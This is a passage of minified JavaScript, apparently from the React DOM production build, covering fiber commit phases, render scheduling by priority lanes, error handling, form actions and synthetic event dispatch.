13:xl(n,i,l),l&&c&4&&Rf(n,i);break;case 22:i.memoizedState===null&&xl(n,i,l),Bn(i,i.return);break;case 30:break;default:xl(n,i,l)}t=t.sibling}}function cu(e,t){var l=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(l=e.memoizedState.cachePool.pool),e=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(e=t.memoizedState.cachePool.pool),e!==l&&(e!=null&&e.refCount++,l!=null&&Cn(l))}function uu(e,t){e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Cn(e))}function Jt(e,t,l,a){if(t.subtreeFlags&10256)for(t=t.child;t!==null;)Bf(e,t,l,a),t=t.sibling}function Bf(e,t,l,a){var n=t.flags;switch(t.tag){case 0:case 11:case 15:Jt(e,t,l,a),n&2048&&Ln(9,t);break;case 1:Jt(e,t,l,a);break;case 3:Jt(e,t,l,a),n&2048&&(e=null,t.alternate!==null&&(e=t.alternate.memoizedState.cache),t=t.memoizedState.cache,t!==e&&(t.refCount++,e!=null&&Cn(e)));break;case 12:if(n&2048){Jt(e,t,l,a),e=t.stateNode;try{var i=t.memoizedProps,c=i.id,u=i.onPostCommit;typeof u=="function"&&u(c,t.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(r){Ee(t,t.return,r)}}else Jt(e,t,l,a);break;case 31:Jt(e,t,l,a);break;case 13:Jt(e,t,l,a);break;case 23:break;case 22:i=t.stateNode,c=t.alternate,t.memoizedState!==null?i._visibility&2?Jt(e,t,l,a):Yn(e,t):i._visibility&2?Jt(e,t,l,a):(i._visibility|=2,Ja(e,t,l,a,(t.subtreeFlags&10256)!==0||!1)),n&2048&&cu(c,t);break;case 24:Jt(e,t,l,a),n&2048&&uu(t.alternate,t);break;default:Jt(e,t,l,a)}}function Ja(e,t,l,a,n){for(n=n&&((t.subtreeFlags&10256)!==0||!1),t=t.child;t!==null;){var i=e,c=t,u=l,r=a,p=c.flags;switch(c.tag){case 0:case 11:case 15:Ja(i,c,u,r,n),Ln(8,c);break;case 23:break;case 22:var x=c.stateNode;c.memoizedState!==null?x._visibility&2?Ja(i,c,u,r,n):Yn(i,c):(x._visibility|=2,Ja(i,c,u,r,n)),n&&p&2048&&cu(c.alternate,c);break;case 24:Ja(i,c,u,r,n),n&&p&2048&&uu(c.alternate,c);break;default:Ja(i,c,u,r,n)}t=t.sibling}}function Yn(e,t){if(t.subtreeFlags&10256)for(t=t.child;t!==null;){var l=e,a=t,n=a.flags;switch(a.tag){case 22:Yn(l,a),n&2048&&cu(a.alternate,a);break;case 24:Yn(l,a),n&2048&&uu(a.alternate,a);break;default:Yn(l,a)}t=t.sibling}}var qn=8192;function Wa(e,t,l){if(e.subtreeFlags&qn)for(e=e.child;e!==null;)Yf(e,t,l),e=e.sibling}function Yf(e,t,l){switch(e.tag){case 26:Wa(e,t,l),e.flags&qn&&e.memoizedState!==null&&Ty(l,Kt,e.memoizedState,e.memoizedProps);break;case 5:Wa(e,t,l);break;case 3:case 4:var a=Kt;Kt=ms(e.stateNode.containerInfo),Wa(e,t,l),Kt=a;break;case 22:e.memoizedState===null&&(a=e.alternate,a!==null&&a.memoizedState!==null?(a=qn,qn=16777216,Wa(e,t,l),qn=a):Wa(e,t,l));break;default:Wa(e,t,l)}}function qf(e){var t=e.alternate;if(t!==null&&(e=t.child,e!==null)){t.child=null;do t=e.sibling,e.sibling=null,e=t;while(e!==null)}}function Gn(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];it=a,Vf(a,e)}qf(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)Gf(e),e=e.sibling}function Gf(e){switch(e.tag){case 0:case 11:case 15:Gn(e),e.flags&2048&&Rl(9,e,e.return);break;case 3:Gn(e);break;case 12:Gn(e);break;case 22:var t=e.stateNode;e.memoizedState!==null&&t._visibility&2&&(e.return===null||e.return.tag!==13)?(t._visibility&=-3,ts(e)):Gn(e);break;default:Gn(e)}}function ts(e){var t=e.deletions;if((e.flags&16)!==0){if(t!==null)for(var l=0;l<t.length;l++){var a=t[l];it=a,Vf(a,e)}qf(e)}for(e=e.child;e!==null;){switch(t=e,t.tag){case 0:case 11:case 15:Rl(8,t,t.return),ts(t);break;case 22:l=t.stateNode,l._visibility&2&&(l._visibility&=-3,ts(t));break;default:ts(t)}e=e.sibling}}function Vf(e,t){for(;it!==null;){var l=it;switch(l.tag){case 0:case 11:case 15:Rl(8,l,t);break;case 23:case 22:if(l.memoizedState!==null&&l.memoizedState.cachePool!==null){var a=l.memoizedState.cachePool.pool;a!=null&&a.refCount++}break;case 24:Cn(l.memoizedState.cache)}if(a=l.child,a!==null)a.return=l,it=a;else e:for(l=e;it!==null;){a=it;var n=a.sibling,i=a.return;if(Df(a),a===l){it=null;break e}if(n!==null){n.return=i,it=n;break e}it=i}}}var Lm={getCacheForType:function(e){var t=ut(We),l=t.data.get(e);return l===void 0&&(l=e(),t.data.set(e,l)),l},cacheSignal:function(){return ut(We).controller.signal}},Bm=typeof WeakMap=="function"?WeakMap:Map,je=0,_e=null,de=null,me=0,Ae=0,_t=null,Ul=!1,$a=!1,ou=!1,jl=0,qe=0,Ll=0,pa=0,ru=0,Mt=0,Fa=0,Vn=null,Tt=null,fu=!1,ls=0,Xf=0,as=1/0,ns=null,Bl=null,et=0,Yl=null,Ia=null,Tl=0,du=0,hu=null,Qf=null,Xn=0,mu=null;function Dt(){return(je&2)!==0&&me!==0?me&-me:S.T!==null?Su():E()}function Zf(){if(Mt===0)if((me&536870912)===0||ge){var e=xa;xa<<=1,(xa&3932160)===0&&(xa=262144),Mt=e}else Mt=536870912;return e=Ot.current,e!==null&&(e.flags|=32),Mt}function Nt(e,t,l){(e===_e&&(Ae===2||Ae===9)||e.cancelPendingCommit!==null)&&(Pa(e,0),ql(e,me,Mt,!1)),Il(e,l),((je&2)===0||e!==_e)&&(e===_e&&((je&2)===0&&(pa|=l),qe===4&&ql(e,me,Mt,!1)),el(e))}function Kf(e,t,l){if((je&6)!==0)throw Error(m(327));var a=!l&&(t&127)===0&&(t&e.expiredLanes)===0||Fl(e,t),n=a?Gm(e,t):pu(e,t,!0),i=a;do{if(n===0){$a&&!a&&ql(e,t,0,!1);break}else{if(l=e.current.alternate,i&&!Ym(l)){n=pu(e,t,!1),i=!1;continue}if(n===2){if(i=t,e.errorRecoveryDisabledLanes&i)var c=0;else c=e.pendingLanes&-536870913,c=c!==0?c:c&536870912?536870912:0;if(c!==0){t=c;e:{var u=e;n=Vn;var r=u.current.memoizedState.isDehydrated;if(r&&(Pa(u,c).flags|=256),c=pu(u,c,!1),c!==2){if(ou&&!r){u.errorRecoveryDisabledLanes|=i,pa|=i,n=4;break e}i=Tt,Tt=n,i!==null&&(Tt===null?Tt=i:Tt.push.apply(Tt,i))}n=c}if(i=!1,n!==2)continue}}if(n===1){Pa(e,0),ql(e,t,0,!0);break}e:{switch(a=e,i=n,i){case 0:case 1:throw Error(m(345));case 4:if((t&4194048)!==t)break;case 6:ql(a,t,Mt,!Ul);break e;case 2:Tt=null;break;case 3:case 5:break;default:throw Error(m(329))}if((t&62914560)===t&&(n=ls+300-yt(),10<n)){if(ql(a,t,Mt,!Ul),Ta(a,0,!0)!==0)break e;Tl=t,a.timeoutHandle=Nd(Jf.bind(null,a,l,Tt,ns,fu,t,Mt,pa,Fa,Ul,i,"Throttled",-0,0),n);break e}Jf(a,l,Tt,ns,fu,t,Mt,pa,Fa,Ul,i,null,-0,0)}}break}while(!0);el(e)}function Jf(e,t,l,a,n,i,c,u,r,p,x,A,g,v){if(e.timeoutHandle=-1,A=t.subtreeFlags,A&8192||(A&16785408)===16785408){A={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:ul},Yf(t,i,A);var L=(i&62914560)===i?ls-yt():(i&4194048)===i?Xf-yt():0;if(L=Ny(A,L),L!==null){Tl=i,e.cancelPendingCommit=L(ld.bind(null,e,t,i,l,a,n,c,u,r,x,A,null,g,v)),ql(e,i,c,!p);return}}ld(e,t,i,l,a,n,c,u,r)}function Ym(e){for(var t=e;;){var l=t.tag;if((l===0||l===11||l===15)&&t.flags&16384&&(l=t.updateQueue,l!==null&&(l=l.stores,l!==null)))for(var a=0;a<l.length;a++){var n=l[a],i=n.getSnapshot;n=n.value;try{if(!Et(i(),n))return!1}catch{return!1}}if(l=t.child,t.subtreeFlags&16384&&l!==null)l.return=t,t=l;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function ql(e,t,l,a){t&=~ru,t&=~pa,e.suspendedLanes|=t,e.pingedLanes&=~t,a&&(e.warmLanes|=t),a=e.expirationTimes;for(var n=t;0<n;){var i=31-gt(n),c=1<<i;a[i]=-1,n&=~c}l!==0&&Na(e,l,t)}function is(){return(je&6)===0?(Qn(0),!1):!0}function yu(){if(de!==null){if(Ae===0)var e=de.return;else e=de,dl=ca=null,_c(e),Va=null,En=0,e=de;for(;e!==null;)Cf(e.alternate,e),e=e.return;de=null}}function Pa(e,t){var l=e.timeoutHandle;l!==-1&&(e.timeoutHandle=-1,sy(l)),l=e.cancelPendingCommit,l!==null&&(e.cancelPendingCommit=null,l()),Tl=0,yu(),_e=e,de=l=rl(e.current,null),me=t,Ae=0,_t=null,Ul=!1,$a=Fl(e,t),ou=!1,Fa=Mt=ru=pa=Ll=qe=0,Tt=Vn=null,fu=!1,(t&8)!==0&&(t|=t&32);var a=e.entangledLanes;if(a!==0)for(e=e.entanglements,a&=t;0<a;){var n=31-gt(a),i=1<<n;t|=e[n],a&=~i}return jl=t,Ai(),l}function Wf(e,t){ae=null,S.H=kn,t===Ga||t===Hi?(t=rr(),Ae=3):t===bc?(t=rr(),Ae=4):Ae=t===Kc?8:t!==null&&typeof t=="object"&&typeof t.then=="function"?6:1,_t=t,de===null&&(qe=1,Ji(e,Lt(t,e.current)))}function $f(){var e=Ot.current;return e===null?!0:(me&4194048)===me?Gt===null:(me&62914560)===me||(me&536870912)!==0?e===Gt:!1}function Ff(){var e=S.H;return S.H=kn,e===null?kn:e}function If(){var e=S.A;return S.A=Lm,e}function ss(){qe=4,Ul||(me&4194048)!==me&&Ot.current!==null||($a=!0),(Ll&134217727)===0&&(pa&134217727)===0||_e===null||ql(_e,me,Mt,!1)}function pu(e,t,l){var a=je;je|=2;var n=Ff(),i=If();(_e!==e||me!==t)&&(ns=null,Pa(e,t)),t=!1;var c=qe;e:do try{if(Ae!==0&&de!==null){var u=de,r=_t;switch(Ae){case 8:yu(),c=6;break e;case 3:case 2:case 9:case 6:Ot.current===null&&(t=!0);var p=Ae;if(Ae=0,_t=null,en(e,u,r,p),l&&$a){c=0;break e}break;default:p=Ae,Ae=0,_t=null,en(e,u,r,p)}}qm(),c=qe;break}catch(x){Wf(e,x)}while(!0);return t&&e.shellSuspendCounter++,dl=ca=null,je=a,S.H=n,S.A=i,de===null&&(_e=null,me=0,Ai()),c}function qm(){for(;de!==null;)Pf(de)}function Gm(e,t){var l=je;je|=2;var a=Ff(),n=If();_e!==e||me!==t?(ns=null,as=yt()+500,Pa(e,t)):$a=Fl(e,t);e:do try{if(Ae!==0&&de!==null){t=de;var i=_t;t:switch(Ae){case 1:Ae=0,_t=null,en(e,t,i,1);break;case 2:case 9:if(ur(i)){Ae=0,_t=null,ed(t);break}t=function(){Ae!==2&&Ae!==9||_e!==e||(Ae=7),el(e)},i.then(t,t);break e;case 3:Ae=7;break e;case 4:Ae=5;break e;case 7:ur(i)?(Ae=0,_t=null,ed(t)):(Ae=0,_t=null,en(e,t,i,7));break;case 5:var c=null;switch(de.tag){case 26:c=de.memoizedState;case 5:case 27:var u=de;if(c?Bd(c):u.stateNode.complete){Ae=0,_t=null;var r=u.sibling;if(r!==null)de=r;else{var p=u.return;p!==null?(de=p,cs(p)):de=null}break t}}Ae=0,_t=null,en(e,t,i,5);break;case 6:Ae=0,_t=null,en(e,t,i,6);break;case 8:yu(),qe=6;break e;default:throw Error(m(462))}}Vm();break}catch(x){Wf(e,x)}while(!0);return dl=ca=null,S.H=a,S.A=n,je=l,de!==null?0:(_e=null,me=0,Ai(),qe)}function Vm(){for(;de!==null&&!_s();)Pf(de)}function Pf(e){var t=Tf(e.alternate,e,jl);e.memoizedProps=e.pendingProps,t===null?cs(e):de=t}function ed(e){var t=e,l=t.alternate;switch(t.tag){case 15:case 0:t=gf(l,t,t.pendingProps,t.type,void 0,me);break;case 11:t=gf(l,t,t.pendingProps,t.type.render,t.ref,me);break;case 5:_c(t);default:Cf(l,t),t=de=Fo(t,jl),t=Tf(l,t,jl)}e.memoizedProps=e.pendingProps,t===null?cs(e):de=t}function en(e,t,l,a){dl=ca=null,_c(t),Va=null,En=0;var n=t.return;try{if(_m(e,n,t,l,me)){qe=1,Ji(e,Lt(l,e.current)),de=null;return}}catch(i){if(n!==null)throw de=n,i;qe=1,Ji(e,Lt(l,e.current)),de=null;return}t.flags&32768?(ge||a===1?e=!0:$a||(me&536870912)!==0?e=!1:(Ul=e=!0,(a===2||a===9||a===3||a===6)&&(a=Ot.current,a!==null&&a.tag===13&&(a.flags|=16384))),td(t,e)):cs(t)}function cs(e){var t=e;do{if((t.flags&32768)!==0){td(t,Ul);return}e=t.return;var l=Hm(t.alternate,t,jl);if(l!==null){de=l;return}if(t=t.sibling,t!==null){de=t;return}de=t=e}while(t!==null);qe===0&&(qe=5)}function td(e,t){do{var l=km(e.alternate,e);if(l!==null){l.flags&=32767,de=l;return}if(l=e.return,l!==null&&(l.flags|=32768,l.subtreeFlags=0,l.deletions=null),!t&&(e=e.sibling,e!==null)){de=e;return}de=e=l}while(e!==null);qe=6,de=null}function ld(e,t,l,a,n,i,c,u,r){e.cancelPendingCommit=null;do us();while(et!==0);if((je&6)!==0)throw Error(m(327));if(t!==null){if(t===e.current)throw Error(m(177));if(i=t.lanes|t.childLanes,i|=nc,hn(e,l,i,c,u,r),e===_e&&(de=_e=null,me=0),Ia=t,Yl=e,Tl=l,du=i,hu=n,Qf=a,(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,Km(ba,function(){return cd(),null})):(e.callbackNode=null,e.callbackPriority=0),a=(t.flags&13878)!==0,(t.subtreeFlags&13878)!==0||a){a=S.T,S.T=null,n=_.p,_.p=2,c=je,je|=4;try{Rm(e,t,l)}finally{je=c,_.p=n,S.T=a}}et=1,ad(),nd(),id()}}function ad(){if(et===1){et=0;var e=Yl,t=Ia,l=(t.flags&13878)!==0;if((t.subtreeFlags&13878)!==0||l){l=S.T,S.T=null;var a=_.p;_.p=2;var n=je;je|=4;try{Uf(t,e);var i=zu,c=Go(e.containerInfo),u=i.focusedElem,r=i.selectionRange;if(c!==u&&u&&u.ownerDocument&&qo(u.ownerDocument.documentElement,u)){if(r!==null&&Ps(u)){var p=r.start,x=r.end;if(x===void 0&&(x=p),"selectionStart"in u)u.selectionStart=p,u.selectionEnd=Math.min(x,u.value.length);else{var A=u.ownerDocument||document,g=A&&A.defaultView||window;if(g.getSelection){var v=g.getSelection(),L=u.textContent.length,J=Math.min(r.start,L),we=r.end===void 0?J:Math.min(r.end,L);!v.extend&&J>we&&(c=we,we=J,J=c);var h=Yo(u,J),d=Yo(u,we);if(h&&d&&(v.rangeCount!==1||v.anchorNode!==h.node||v.anchorOffset!==h.offset||v.focusNode!==d.node||v.focusOffset!==d.offset)){var y=A.createRange();y.setStart(h.node,h.offset),v.removeAllRanges(),J>we?(v.addRange(y),v.extend(d.node,d.offset)):(y.setEnd(d.node,d.offset),v.addRange(y))}}}}for(A=[],v=u;v=v.parentNode;)v.nodeType===1&&A.push({element:v,left:v.scrollLeft,top:v.scrollTop});for(typeof u.focus=="function"&&u.focus(),u=0;u<A.length;u++){var N=A[u];N.element.scrollLeft=N.left,N.element.scrollTop=N.top}}Ss=!!Eu,zu=Eu=null}finally{je=n,_.p=a,S.T=l}}e.current=t,et=2}}function nd(){if(et===2){et=0;var e=Yl,t=Ia,l=(t.flags&8772)!==0;if((t.subtreeFlags&8772)!==0||l){l=S.T,S.T=null;var a=_.p;_.p=2;var n=je;je|=4;try{Mf(e,t.alternate,t)}finally{je=n,_.p=a,S.T=l}}et=3}}function id(){if(et===4||et===3){et=0,Ms();var e=Yl,t=Ia,l=Tl,a=Qf;(t.subtreeFlags&10256)!==0||(t.flags&10256)!==0?et=5:(et=0,Ia=Yl=null,sd(e,e.pendingLanes));var n=e.pendingLanes;if(n===0&&(Bl=null),b(l),t=t.stateNode,pt&&typeof pt.onCommitFiberRoot=="function")try{pt.onCommitFiberRoot($l,t,void 0,(t.current.flags&128)===128)}catch{}if(a!==null){t=S.T,n=_.p,_.p=2,S.T=null;try{for(var i=e.onRecoverableError,c=0;c<a.length;c++){var u=a[c];i(u.value,{componentStack:u.stack})}}finally{S.T=t,_.p=n}}(Tl&3)!==0&&us(),el(e),n=e.pendingLanes,(l&261930)!==0&&(n&42)!==0?e===mu?Xn++:(Xn=0,mu=e):Xn=0,Qn(0)}}function sd(e,t){(e.pooledCacheLanes&=t)===0&&(t=e.pooledCache,t!=null&&(e.pooledCache=null,Cn(t)))}function us(){return ad(),nd(),id(),cd()}function cd(){if(et!==5)return!1;var e=Yl,t=du;du=0;var l=b(Tl),a=S.T,n=_.p;try{_.p=32>l?32:l,S.T=null,l=hu,hu=null;var i=Yl,c=Tl;if(et=0,Ia=Yl=null,Tl=0,(je&6)!==0)throw Error(m(331));var u=je;if(je|=4,Gf(i.current),Bf(i,i.current,c,l),je=u,Qn(0,!1),pt&&typeof pt.onPostCommitFiberRoot=="function")try{pt.onPostCommitFiberRoot($l,i)}catch{}return!0}finally{_.p=n,S.T=a,sd(e,t)}}function ud(e,t,l){t=Lt(l,t),t=Zc(e.stateNode,t,2),e=Dl(e,t,2),e!==null&&(Il(e,2),el(e))}function Ee(e,t,l){if(e.tag===3)ud(e,e,l);else for(;t!==null;){if(t.tag===3){ud(t,e,l);break}else if(t.tag===1){var a=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof a.componentDidCatch=="function"&&(Bl===null||!Bl.has(a))){e=Lt(l,e),l=of(2),a=Dl(t,l,2),a!==null&&(rf(l,a,t,e),Il(a,2),el(a));break}}t=t.return}}function gu(e,t,l){var a=e.pingCache;if(a===null){a=e.pingCache=new Bm;var n=new Set;a.set(t,n)}else n=a.get(t),n===void 0&&(n=new Set,a.set(t,n));n.has(l)||(ou=!0,n.add(l),e=Xm.bind(null,e,t,l),t.then(e,e))}function Xm(e,t,l){var a=e.pingCache;a!==null&&a.delete(t),e.pingedLanes|=e.suspendedLanes&l,e.warmLanes&=~l,_e===e&&(me&l)===l&&(qe===4||qe===3&&(me&62914560)===me&&300>yt()-ls?(je&2)===0&&Pa(e,0):ru|=l,Fa===me&&(Fa=0)),el(e)}function od(e,t){t===0&&(t=di()),e=na(e,t),e!==null&&(Il(e,t),el(e))}function Qm(e){var t=e.memoizedState,l=0;t!==null&&(l=t.retryLane),od(e,l)}function Zm(e,t){var l=0;switch(e.tag){case 31:case 13:var a=e.stateNode,n=e.memoizedState;n!==null&&(l=n.retryLane);break;case 19:a=e.stateNode;break;case 22:a=e.stateNode._retryCache;break;default:throw Error(m(314))}a!==null&&a.delete(t),od(e,l)}function Km(e,t){return va(e,t)}var os=null,tn=null,vu=!1,rs=!1,bu=!1,Gl=0;function el(e){e!==tn&&e.next===null&&(tn===null?os=tn=e:tn=tn.next=e),rs=!0,vu||(vu=!0,Wm())}function Qn(e,t){if(!bu&&rs){bu=!0;do for(var l=!1,a=os;a!==null;){if(e!==0){var n=a.pendingLanes;if(n===0)var i=0;else{var c=a.suspendedLanes,u=a.pingedLanes;i=(1<<31-gt(42|e)+1)-1,i&=n&~(c&~u),i=i&201326741?i&201326741|1:i?i|2:0}i!==0&&(l=!0,hd(a,i))}else i=me,i=Ta(a,a===_e?i:0,a.cancelPendingCommit!==null||a.timeoutHandle!==-1),(i&3)===0||Fl(a,i)||(l=!0,hd(a,i));a=a.next}while(l);bu=!1}}function Jm(){rd()}function rd(){rs=vu=!1;var e=0;Gl!==0&&iy()&&(e=Gl);for(var t=yt(),l=null,a=os;a!==null;){var n=a.next,i=fd(a,t);i===0?(a.next=null,l===null?os=n:l.next=n,n===null&&(tn=l)):(l=a,(e!==0||(i&3)!==0)&&(rs=!0)),a=n}et!==0&&et!==5||Qn(e),Gl!==0&&(Gl=0)}function fd(e,t){for(var l=e.suspendedLanes,a=e.pingedLanes,n=e.expirationTimes,i=e.pendingLanes&-62914561;0<i;){var c=31-gt(i),u=1<<c,r=n[c];r===-1?((u&l)===0||(u&a)!==0)&&(n[c]=Rs(u,t)):r<=t&&(e.expiredLanes|=u),i&=~u}if(t=_e,l=me,l=Ta(e,e===t?l:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a=e.callbackNode,l===0||e===t&&(Ae===2||Ae===9)||e.cancelPendingCommit!==null)return a!==null&&a!==null&&rn(a),e.callbackNode=null,e.callbackPriority=0;if((l&3)===0||Fl(e,l)){if(t=l&-l,t===e.callbackPriority)return t;switch(a!==null&&rn(a),b(l)){case 2:case 8:l=ui;break;case 32:l=ba;break;case 268435456:l=oi;break;default:l=ba}return a=dd.bind(null,e),l=va(l,a),e.callbackPriority=t,e.callbackNode=l,t}return a!==null&&a!==null&&rn(a),e.callbackPriority=2,e.callbackNode=null,2}function dd(e,t){if(et!==0&&et!==5)return e.callbackNode=null,e.callbackPriority=0,null;var l=e.callbackNode;if(us()&&e.callbackNode!==l)return null;var a=me;return a=Ta(e,e===_e?a:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),a===0?null:(Kf(e,a,t),fd(e,yt()),e.callbackNode!=null&&e.callbackNode===l?dd.bind(null,e):null)}function hd(e,t){if(us())return null;Kf(e,t,!0)}function Wm(){cy(function(){(je&6)!==0?va(ci,Jm):rd()})}function Su(){if(Gl===0){var e=Ya;e===0&&(e=Sa,Sa<<=1,(Sa&261888)===0&&(Sa=256)),Gl=e}return Gl}function md(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:vi(""+e)}function yd(e,t){var l=t.ownerDocument.createElement("input");return l.name=t.name,l.value=t.value,e.id&&l.setAttribute("form",e.id),t.parentNode.insertBefore(l,t),e=new FormData(e),l.parentNode.removeChild(l),e}function $m(e,t,l,a,n){if(t==="submit"&&l&&l.stateNode===n){var i=md((n[fe]||null).action),c=a.submitter;c&&(t=(t=c[fe]||null)?md(t.formAction):c.getAttribute("formAction"),t!==null&&(i=t,c=null));var u=new ji("action","action",null,a,n);e.push({event:u,listeners:[{instance:null,listener:function(){if(a.defaultPrevented){if(Gl!==0){var r=c?yd(n,c):new FormData(n);Yc(l,{pending:!0,data:r,method:n.method,action:i},null,r)}}else typeof i=="function"&&(u.preventDefault(),r=c?yd(n,c):new FormData(n),Yc(l,{pending:!0,data:r,method:n.method,action:i},i,r))},currentTarget:n}]})}}for(var xu=0;xu<ac.length;xu++){var ju=ac[xu],Fm=ju.toLowerCase(),Im=ju[0].toUpperCase()+ju.slice(1);Zt(Fm,"on"+Im)}Zt(Qo,"onAnimationEnd"),Zt(Zo,"onAnimationIteration"),Zt(Ko,"onAnimationStart"),Zt("dblclick","onDoubleClick"),Zt("focusin","onFocus"),Zt("focusout","onBlur"),Zt(mm,"onTransitionRun"),Zt(ym,"onTransitionStart"),Zt(pm,"onTransitionCancel"),Zt(Jo,"onTransitionEnd"),Aa("onMouseEnter",["mouseout","mouseover"]),Aa("onMouseLeave",["mouseout","mouseover"]),Aa("onPointerEnter",["pointerout","pointerover"]),Aa("onPointerLeave",["pointerout","pointerover"]),ea("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),ea("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),ea("onBeforeInput",["compositionend","keypress","textInput","paste"]),ea("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),ea("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),ea("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Zn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Pm=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Zn));function pd(e,t){t=(t&4)!==0;for(var l=0;l<e.length;l++){var a=e[l],n=a.event;a=a.listeners;e:{var i=void 0;if(t)for(var c=a.length-1;0<=c;c--){var u=a[c],r=u.instance,p=u.currentTarget;if(u=u.listener,r!==i&&n.isPropagationStopped())break e;i=u,n.currentTarget=p;try{i(n)}catch(x){Ci(x)}n.currentTarget=null,i=r}else for(c=0;c<a.length;c++){if(u=a[c],r=u.instance,p=u.currentTarget,u=u.listener,r!==i&&n.isPropagationStopped())break e;i=u,n.currentTarget=p;try{i(n)}catch(x){Ci(x)}n.currentTarget=null,i=r}}}}function he(e,t){var l=t[Ct];l===void 0&&(l=t[Ct]=new Set);var a=e+"__bubble";l.has(a)||(gd(t,e,2,!1),l.add(a))}function Tu(e,t,l){var a=0;t&&(a|=4),gd(l,e,a,t)}var fs="_reactListening"+Math.random().toString(36).slice(2);function Nu(e){if(!e[fs]){e[fs]=!0,uo.forEach(function(l){l!=="selectionchange"&&(Pm.has(l)||Tu(l,!1,e),Tu(l,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[fs]||(t[fs]=!0,Tu("selectionchange",!1,t))}}function gd(e,t,l,a){switch(Zd(t)){case 2:var n=Ey;break;case 8:n=zy;break;default:n=Bu}l=n.bind(null,t,l,e),n=void 0,!Xs||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(n=!0),a?n!==void 0?e.addEventListener(t,l,{capture:!0,passive:n}):e.addEventListener(t,l,!0):n!==void 0?e.addEventListener(t,l,{passive:n}):e.addEventListener(t,l,!1)}function Cu(e,t,l,a,n){var i=a;if((t&1)===0&&(t&2)===0&&a!==null)e:for(;;){if(a===null)return;var c=a.tag;if(c===3||c===4){var u=a.stateNode.containerInfo;if(u===n)break;if(c===4)for(c=a.return;c!==null;){var r=c.tag;if((r===3||r===4)&&c.stateNode.containerInfo===n)return;c=c.return}for(;u!==null;){if(c=at(u),c===null)return;if(r=c.tag,r===5||r===6||r===26||r===27){a=i=c;continue e}u=u.parentNode}}a=a.return}xo(function(){var p=i,x=Gs(l),A=[];e:{var g=Wo.get(e);if(g!==void 0){var v=ji,L=e;switch(e){case"keypress":if(Si(l)===0)break e;case"keydown":case"keyup":v=Zh;break;case"focusin":L="focus",v=Js;break;case"focusout":L="blur",v=Js;break;case"beforeblur":case"afterblur":v=Js;break;case"click":if(l.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":v=No;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":v=Hh;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":v=Wh;break;case Qo:case Zo:case Ko:v=Uh;break;case Jo:v=Fh;break;case"scroll":case"scrollend":v=Mh;break;case"wheel":v=Ph;break;case"copy":case"cut":case"paste":v=Bh;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":v=Ao;break;case"toggle":case"beforetoggle":v=tm}var J=(t&4)!==0,we=!J&&(e==="scroll"||e==="scrollend"),h=J?g!==null?g+"Capture":null:g;J=[];for(var d=p,y;d!==null;){var N=d;if(y=N.stateNode,N=N.tag,N!==5&&N!==26&&N!==27||y===null||h===null||(N=mn(d,h),N!=null&&J.push(Kn(d,N,y))),we)break;d=d.return}0<J.length&&(g=new v(g,L,null,l,x),A.push({event:g,listeners:J}))}}if((t&7)===0){e:{if(g=e==="mouseover"||e==="pointerover",v=e==="mouseout"||e==="pointerout",g&&l!==qs&&(L=l.relatedTarget||l.fromElement)&&(at(L)||L[Ue]))break e;if((v||g)&&(g=x.window===x?x:(g=x.ownerDocument)?g.defaultView||g.parentWindow:window,v?(L=l.relatedTarget||l.toElement,v=p,L=L?at(L):null,L!==null&&(we=W(L),J=L.tag,L!==we||J!==5&&J!==27&&J!==6)&&(L=null)):(v=null,L=p),v!==L)){if(J=No,N="onMouseLeave",h="onMouseEnter",d="mouse",(e==="pointerout"||e==="pointerover")&&(J=Ao,N="onPointerLeave",h="onPointerEnter",d="pointer"),we=v==null?g:sl(v),y=L==null?g:sl(L),g=new J(N,d+"leave",v,l,x),g.target=we,g.relatedTarget=y,N=null,at(x)===p&&(J=new J(h,d+"enter",L,l,x),J.target=y,J.relatedTarget=we,N=J),we=N,v&&L)t:{for(J=ey,h=v,d=L,y=0,N=h;N;N=J(N))y++;N=0;for(var Z=d;Z;Z=J(Z))N++;for(;0<y-N;)h=J(h),y--;for(;0<N-y;)d=J(d),N--;for(;y--;){if(h===d||d!==null&&h===d.alternate){J=h;break t}h=J(h),d=J(d)}J=null}else J=null;v!==null&&vd(A,g,v,J,!1),L!==null&&we!==null&&vd(A,we,L,J,!0)}}e:{if(g=p?sl(p):window,v=g.nodeName&&g.nodeName.toLowerCase(),v==="select"||v==="input"&&g.type==="file")var be=Ho;else if(Mo(g))if(ko)be=fm;else{be=om;var Y=um}else 